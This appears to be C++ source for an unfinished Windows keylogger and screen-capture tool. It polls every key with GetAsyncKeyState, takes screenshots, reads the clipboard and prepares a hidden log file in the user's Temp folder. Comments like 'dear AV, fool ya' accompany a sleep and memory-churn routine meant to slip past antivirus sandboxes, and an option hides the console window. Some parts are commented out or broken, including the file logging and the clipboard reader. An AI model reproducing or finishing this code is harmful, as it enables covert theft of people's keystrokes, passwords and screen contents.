#include "stdafx.h"
#include <windows.h>
#include <cstdlib>
#include <iostream>
#include <gdiplus.h>
#include <stdio.h>
#include <iostream>
#include <atlimage.h> 
#include <Gdiplusimaging.h> 
#pragma comment(lib,"gdiplus.lib")
#pragma comment (lib, "user32.lib")
//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib, "ws2_32.lib")
using namespace Gdiplus;

//		G L O B A L S
bool		wasAltPressed;
bool		wasShiftPressed;
wchar_t		fileName[256];
HANDLE		hFile = INVALID_HANDLE_VALUE;
DWORD		dwBytesWritten;
const bool hideConsoleAtStart = false; //if true, hide cmd.exe - FYI output is written on stdout
const int	howMuchSecondsWaitAtStart = 3; //don't go below 3 seconds, though

//		d e c l a r a c t i on
DWORD determineKey(DWORD sScannedKey);

//*********************************************************
void WriteToFile(DWORD *wText)
{
    hFile = CreateFile( (LPTSTR) fileName,
						FILE_APPEND_DATA,     // open for write 
						FILE_SHARE_READ,      // do not share 
						NULL,                 // default security 
						OPEN_ALWAYS,        // overwrite existing
						FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
						NULL);                // no template 
	std::cout << (char *)wText << std::endl;
	WriteFile(hFile, wText, 1, &dwBytesWritten, NULL);
	//WriteFile(hFile, (LPCVOID)'?', 1, &dwBytesWritten, NULL);
    CloseHandle(hFile);
}
//*********************************************************
DWORD FetchKeyCode( )
{
    DWORD i     = 0x00;
    DWORD ret   = 0x00;
    do{
        if( GetAsyncKeyState(i)&0x1 )
            ret = i;
        i++;
    }while( !ret && i < 0xFF );

    return ret;
}
//*********************************************************
char VKtoCHAR(int vk)
{
    static UCHAR keyboardState[256];
    USHORT asciiVal;
	//get layout
    static HKL layout = GetKeyboardLayout(0);     
	//get keyboard state (shift etc)
    if( GetKeyboardState(keyboardState) == false )
        return 0;
    if( ToAsciiEx( vk, MapVirtualKey(vk,0), keyboardState, &asciiVal, 0, layout ) == 0 )/*ASCII*/
        return 0;
    return static_cast<char>(asciiVal);
}
//*********************************************************
bool determineOS() 
{
	//on what OS we r ?
    DWORD   version = GetVersion();
    DWORD   major   = (DWORD)(LOBYTE(LOWORD(version)));
    DWORD   minor   = (DWORD)(HIBYTE(LOWORD(version)));
	size_t sz = 0;

    if ((major > 6) || ((major == 6) && (minor >= 1))) 
    {
        //OS is win7 or later
        char * myhome;
		if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)
		{
			_stprintf_s(fileName, L"%s%s", myhome, "\\AppData\\Local\\Temp\\wut");
			free(myhome);
			return true;
		}
    } else if ((major > 5) || ((major == 5) && (minor >= 1))) 
    {
        //OS is xp or later
		char * myhome;
        if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)
		{
			_stprintf_s(fileName, L"%s%s", myhome, "\\Local Settings\\Temp\\wut");
			free(myhome);
			return true;
		}
    }

	return false;
}
//*********************************************************
void trickAVs() { 
	
}
//*********************************************************
bool ImageFromClipboard()
{
	if (/*IsClipboardFormatAvailable(CF_UNICODETEXT) ||*/ IsClipboardFormatAvailable(CF_TEXT))
	{
		if (!OpenClipboard(GetOpenClipboardWindow()))
		{
			printf("NIMA NIC W SCHOWKU\n");
			return false;
		}
 
		HANDLE a = GetClipboardData(CF_TEXT);
		LPWORD b = 0;
		LARGE_INTEGER *c = 0;
		ReadFile(a, b, GetFileSizeEx(a, c), 0, 0);
		printf("%s", b);

		CloseClipboard();
	}
	return true;
}
//*********************************************************
bool TakeScreenshot() {
	//CString w = "x.bmp";
	//HBITMAP hBitmap;
	CImage image; 
	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
    SelectObject(hCaptureDC,hCaptureBitmap); 
    BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,
           hDesktopDC,0,0,SRCCOPY|CAPTUREBLT); 
	image.Attach(hCaptureBitmap);
	image.Save(L"screenshot.png"); 
	return true;
}
//---------------------------------------------------------
int main(int argc, char *argv[]) {

	HWND hWnd = GetConsoleWindow();

	//FreeConsole();
	//dear AV, fool ya
	Sleep(howMuchSecondsWaitAtStart * 1000);
	int *t,/* *y, */*u, *p = NULL;
	t = new int[29999999];
	//y = new int[123];
	u = new int[9999999];
	//p = new int[9999999];
	for (int i = 0; i < 9999998; ++i) {
		t[i] = /*p[i] =*/ u[i];
	}
	//t = y;
	u = p = u = p;
	Sleep(1000);
	if( 5 >= 5 ) {
		delete[] t; 
		//delete[] y; 
		delete[] u; 
		//delete[] p;
	}

	if (hideConsoleAtStart == true)	{
		HWND hWnd = GetConsoleWindow();
		ShowWindow( hWnd, SW_HIDE);
	}

	if (!determineOS())	{
		//we are exiting, but probably we can work trough that
		std::cout << "can't determine OS";
		Sleep(500);
		return 0xDEADBEEF;
	}

	DWORD key = 0;

	while(key != 81/*Q*/) {

		key = FetchKeyCode();

		if (key >= 8 && key <= 222) {
			std::cout << (char)key;

			if (key == 83/*S*/) {
				TakeScreenshot();
				std::cout << "\nScreenshot taken.\n";
			}
		}
        Sleep((rand() % 10) + 10);
	}
	
	/*HWND hWnd = GetConsoleWindow();
	ShowWindow( hWnd, SW_HIDE );*/
	//HWND hWnd;
	
	//CaptureScreen();
	/*OPENFILENAME	ofn;
	char	szFileName[512]; 
	strcpy_s(szFileName, 512, "ScreenShot.bmp");

	ZeroMemory(&ofn,sizeof(ofn));
	ofn.lStructSize=sizeof(OPENFILENAME);
	ofn.Flags=OFN_HIDEREADONLY|OFN_PATHMUSTEXIST;
	ofn.lpstrFilter = L"Bitmap Files (*.bmp)\0*.bmp\0";
	ofn.lpstrDefExt= L"bmp";
	ofn.lpstrFile = L"a.bmp";
	ofn.nMaxFile = 512;
	//ofn.hwndOwner = hWnd;*/
    
    //delete image;
    /*ReleaseDC(hDesktopWnd,hDesktopDC);
    DeleteDC(hCaptureDC);
    DeleteObject(hCaptureBitmap);*/
//	Sleep(1000);
	//while( true )
	//{
		//Sleep(1000*1);
		/*hWnd = GetDesktopWindow();
		keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
		keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

		WaitForSingleObject(hWnd, 1500);*/
		 // Simulate a key press
        /*keybd_event( VK_NUMLOCK,
                      0x45,
                      KEYEVENTF_EXTENDEDKEY | 0,
                      0 );
		// Simulate a key release
         keybd_event( VK_NUMLOCK,
                      0x45,
                      KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,
                      0);*/
		//hBitmap = ImageFromClipboard(hWnd);

		/*OpenClipboard(NULL);
		hBitmap = (HBITMAP) GetClipboardData(CF_BITMAP);

		if (hBitmap == NULL)
		{ printf("????") ; }
		image.Attach(hBitmap); 
		image.Save(w, Gdiplus::ImageFormatBMP); 

		Sleep(1000);*/
	//}
	return 0;
}
//----------------------------------------------------
DWORD determineKey(DWORD sScannedKey)
{
	/*if ((sScannedKey == 65 || sScannedKey == 97) && wasAltPressed)
	{
		std::cout << "¹";
		wasAltPressed = false;
		return (short)sScannedKey;
	}*/

	//WriteToFile((char *)sScannedKey);
	//return sScannedKey;

	/*switch(sScannedKey) 
	{
		//http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
		case VK_RMENU:
			wasAltPressed = true;
			//WriteToFile("[ALT]");
			break;
		case VK_SPACE:
			WriteToFile(" ");
			break;
		//case VK_OEM_1:
		case 58:
			WriteToFile(":");
			break;
		case 59:
			WriteToFile(";");
			break;
		//case VK_OEM_2:
		case 47:
			WriteToFile("/");
			break;
		//case VK_OEM_3:
		case 96:
			WriteToFile("`");
			break;
		case 126:
			WriteToFile("~");
			break;
		case VK_OEM_4:
			WriteToFile("[ [{ ]");
			break;
		case VK_OEM_5:
			WriteToFile("[\\|]");
			break;
		case VK_OEM_6:
			WriteToFile("[ ]} ]");
			break;
		case VK_OEM_7:
			WriteToFile("['\"]");
			break;
		
		case VK_LSHIFT:
		case VK_RSHIFT:
			//wasShiftPressed = true;
			WriteToFile("[SHIFT]");
			break;
		case VK_RETURN:
		WriteToFile("[ENTER]");
		break;
		case VK_BACK:
		WriteToFile("[BACKSPACE]");
		break;
		case VK_TAB:
		WriteToFile("[TAB]");
		break;
		case VK_CONTROL:
		WriteToFile("[CTRL]");
		break;
		case VK_DELETE:
		WriteToFile("[DEL]");
		break;
		case VK_OEM_PLUS:
		WriteToFile("+");
		break;
		case VK_OEM_COMMA:
		WriteToFile(",");
		break;
		case VK_OEM_MINUS:
		WriteToFile("-");
		break;
		case VK_OEM_PERIOD:
		WriteToFile(".");
		break;
		case VK_NUMPAD0:
		WriteToFile("0");
		break;
		case VK_NUMPAD1:
		WriteToFile("1");
		break;
		case VK_NUMPAD2:
		WriteToFile("2");
		break;
		case VK_NUMPAD3:
		WriteToFile("3");
		break;
		case VK_NUMPAD4:
		WriteToFile("4");
		break;
		case VK_NUMPAD5:
		WriteToFile("5");
		break;
		case VK_NUMPAD6:
		WriteToFile("6");
		break;
		case VK_NUMPAD7:
		WriteToFile("7");
		break;
		case VK_NUMPAD8:
		WriteToFile("8");
		break;
		case VK_NUMPAD9:
		WriteToFile("9");
		break;
		case VK_CAPITAL:
		WriteToFile("[CAPS LOCK]");
		break;
		case VK_PRIOR:
		WriteToFile("[PAGE UP]");
		break;
		case VK_NEXT:
		WriteToFile("[PAGE DOWN]");
		break;
		case VK_END:
		WriteToFile("[END]");
		break;
		case VK_HOME:
		WriteToFile("[HOME]");
		break;
		case VK_LWIN:
		case VK_RWIN:
		WriteToFile("[WIN]");
		break;
		default:
		break;
	}*/
	return 0;
}